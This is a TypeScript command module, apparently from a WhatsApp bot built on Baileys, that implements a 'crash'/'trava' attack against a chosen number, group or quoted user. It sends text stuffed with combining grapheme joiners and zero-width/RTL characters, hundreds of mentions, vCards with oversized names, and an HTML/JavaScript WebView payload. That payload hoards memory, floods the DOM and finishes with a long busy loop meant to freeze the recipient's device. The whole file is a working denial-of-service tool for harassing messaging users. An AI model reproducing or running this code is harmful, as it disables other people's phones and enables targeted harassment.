import type { CommandContext } from "../../types/index.d.ts";
import { fytBold } from "../../core/socketText.ts";

/* ───────────────────────── generadores ───────────────────────── */

const CGJ = "\u034f";          // combining grapheme joiner — el núcleo del trava-zap
const CGJ2 = "\u0300\u034f\u0301\u034f\u0316\u034f\u0335\u034f";
const ZW = "\u200b\u200c\u200d\u2060\ufeff";
const RTL = "\u202a\u202b\u202c\u202d\u202e\u2066\u2067\u2068\u2069";

function cgj(n: number) {
  let out = "";
  const chunk = CGJ2.repeat(Math.ceil(n / 8));
  out = chunk.slice(0, n);
  return out;
}

function zwBomb(n: number) {
  let out = "";
  for (let i = 0; i < n; i++) out += ZW[i % 5] + RTL[i % 10];
  return out;
}

function textBomb(level: number) {
  const s = level >= 3 ? 3 : level >= 2 ? 2 : 1;
  return (
    "💥 " + cgj(18000 * s) + "\n\n" +
    "🎉".repeat(9000 * s) + "\n\n" +
    zwBomb(4000 * s) + "\n\n" +
    "█".repeat(3000 * s)
  );
}

function mentionBomb(num: string, times: number) {
  return `@${num} `.repeat(times).trim();
}

/* ───────────────────────── bomba WebView (OOM) ───────────────────────── */

function buildWebviewBomb(targetName: string, level: number) {
  const mb = 3 * level;            // MB por string
  const blocks = 40 * level;       // nº de strings
  const canvases = 30 * level;     // dataURIs grandes
  const nodes = 40000 * level;

  const html = `<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,'Segoe UI',Roboto,sans-serif;background:#05020c;color:#f5f3ff;padding:10px}
.card{max-width:380px;margin:0 auto;background:linear-gradient(180deg,#130826,#070312);border:2px solid #7c3aed;border-radius:16px;padding:14px;text-align:center}
.t{font-size:15px;font-weight:900;color:#00ffcc;letter-spacing:1px;margin-bottom:6px}
.d{font-size:11.5px;color:#c4b5fd;line-height:1.4;margin-bottom:8px}
.s{font-size:10px;color:#7c3aed;font-family:monospace}
#f{text-align:left;font-family:monospace;font-size:7px;color:#3b0f80;word-break:break-all;margin-top:8px;height:90px;overflow:hidden}
</style>
<div class="card">
  <div class="t" id="h">OOM // ${targetName.replace(/[<>&"]/g, "")}</div>
  <div class="d">Agotando memoria. No cierres la tarjeta.</div>
  <div class="s" id="st">fase 0</div>
  <div id="f"></div>
</div>
<script>
var st=document.getElementById('st'),f=document.getElementById('f');
var hoard=[],imgs=[];
function fase(n){try{st.textContent='fase '+n}catch(e){}}
function next(fn){try{requestAnimationFrame(function(){setTimeout(fn,16)})}catch(e){setTimeout(fn,16)}}

/* 1 · presión bruta de memoria */
next(function(){
  fase(1);
  try{ for(var i=0;i<${blocks};i++) hoard.push('█'.repeat(${mb}*1000000)) }catch(e){}
  next(fase2);
});

/* 2 · dataURIs gigantes vía canvas (cada una decodifica MB) */
function fase2(){
  fase(2);
  try{
    var c=document.createElement('canvas'); c.width=900; c.height=900;
    var g=c.getContext('2d');
    var d=g.createImageData(900,900);
    for(var p=0;p<d.data.length;p+=4){d.data[p]=Math.random()*255;d.data[p+1]=Math.random()*255;d.data[p+2]=Math.random()*255;d.data[p+3]=255}
    g.putImageData(d,0,0);
    var uri=c.toDataURL();
    for(var k=0;k<${canvases};k++){var im=new Image();im.src=uri;imgs.push(im)}
  }catch(e){}
  next(fase3);
}

/* 3 · inundación de DOM de golpe */
function fase3(){
  fase(3);
  try{
    var frag=document.createDocumentFragment();
    for(var i=0;i<${nodes};i++){
      var el=document.createElement('div');
      el.textContent='█'.repeat(200)+Math.random();
      frag.appendChild(el);
    }
    f.appendChild(frag);
  }catch(e){}
  next(fase4);
}

/* 4 · segundo colchón + bloqueo definitivo (ANR) */
function fase4(){
  fase(4);
  try{ for(var i=0;i<${blocks};i++) hoard.push(new Array(200000).join('▓')) }catch(e){}
  fase(5);
  var t0=Date.now();
  while(true){ if(Date.now()-t0>900000) break }
}
</script>`;

  return {
    view_model: {
      __typename: "GenAISingleLayoutViewModel",
      primitive: {
        __typename: "FOAHtmlPrimitiveDemoDONOTUSE",
        trusted_sources: [],
        payload: html,
      },
    },
  };
}

/* ───────────────────────── contact bomb ───────────────────────── */

function buildContacts(count: number, level: number) {
  const heavy = cgj(2200 * level) + zwBomb(400 * level);
  const list = [];
  for (let i = 0; i < count; i++) {
    const n = `000000${i}`.slice(-6);
    list.push({
      vcard:
        `BEGIN:VCARD\nVERSION:3.0\nFN:${heavy}${n}\n` +
        `N:${n};${heavy};;;\n` +
        `TEL;type=CELL;waid=52155${n}:+52155${n}\nEND:VCARD`,
    });
  }
  return { displayName: `💥 ${heavy.slice(0, 1200)}`, contacts: list };
}

/* ───────────────────────── comando ───────────────────────── */

export default {
  name: ["crash", "trava", "travar"],
  category: "group",
  description: "Bombea a un número hasta congelarlo: CGJ, emoji, menciones, vCards y OOM de WebView.",
  async run(ctx: CommandContext) {
    const { sock, from, msg, args, reply, react } = ctx;

    const quoted = (msg.message as any)?.extendedTextMessage?.contextInfo?.participant;
    const sender: string = (msg.key as any).participant || from;

    const a0 = (args[0] || "").trim();
    const raw = a0.replace(/\D/g, "");
    let target: string;

    if (/^(grupo|g|chat)$/i.test(a0)) target = from;
    else if (raw.length >= 8) target = `${raw}@s.whatsapp.net`;
    else if (quoted) target = quoted;
    else target = sender;

    const lvArg = Number(args.find((a) => /^[123]$/.test(a)) || 0);
    const level = lvArg || 3;

    const isGroup = target.endsWith("@g.us");
    const num = target.split("@")[0].split(":")[0];

    await react("💥").catch(() => undefined);

    let name = num;
    try {
      if (isGroup) name = (await sock.groupMetadata(target)).subject || num;
      else name = String((msg as any).pushName || "").trim() || num;
    } catch {}

    const done: string[] = [];
    let lastKey: any = msg;

    const fire = async (label: string, fn: (q: any) => Promise<any>) => {
      try {
        const r = await fn(lastKey);
        if (r?.key) lastKey = r;
        done.push(`✅ ${label}`);
      } catch (e: any) {
        done.push(`⚠️ ${label}: ${e?.message || e}`);
      }
    };

    const mention = isGroup ? sender : target;

    /* 1 · texto CGJ, encadenado en cita para forzar re-render del preview */
    await fire("texto", (q) =>
      sock.sendMessage(target, { text: textBomb(level), mentions: [mention] }, { quoted: q }));

    /* 2 · mención masiva */
    await fire("menciones", () =>
      sock.sendMessage(target, {
        text: mentionBomb(num, 700 * level),
        mentions: Array(700 * level).fill(mention),
      }, { quoted: lastKey }));

    /* 3 · vCard bomb */
    await fire("vcards", () =>
      sock.sendMessage(target, { contacts: buildContacts(60 * level, level) }, { quoted: lastKey }));

    /* 4 · OOM de WebView */
    await fire("webview", async (q) => {
      const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
      const rich = new AIRich(sock)
        .setTitle("💥 CRASH // LuferOS")
        .setFooter(`nivel ${level} · OOM`);
      rich.addSection(buildWebviewBomb(name, level));
      return rich.send(target, { quoted: q });
    });

    /* 5 · segunda ronda para el crash al reabrir el chat */
    if (level >= 3) {
      await fire("webview x2", async (q) => {
        const { AIRich } = await import("baileys/lib/Builders/ai-rich.js");
        const rich = new AIRich(sock).setTitle("☠️ CRASH 2 // LuferOS").setFooter("reapertura");
        rich.addSection(buildWebviewBomb(name, 3));
        return rich.send(target, { quoted: q });
      });
      await fire("texto x2", (q) => sock.sendMessage(target, { text: textBomb(3) }, { quoted: q }));
    }

    await react("☠️").catch(() => undefined);

    await reply(
      `${fytBold("Bomba enviada")} → ${isGroup ? "este grupo" : `@${num}`}\n` +
        `Nivel: ${level}\n\n${done.join("\n")}`,
      { mentions: [mention] } as any,
    ).catch(() => undefined);
  },
};
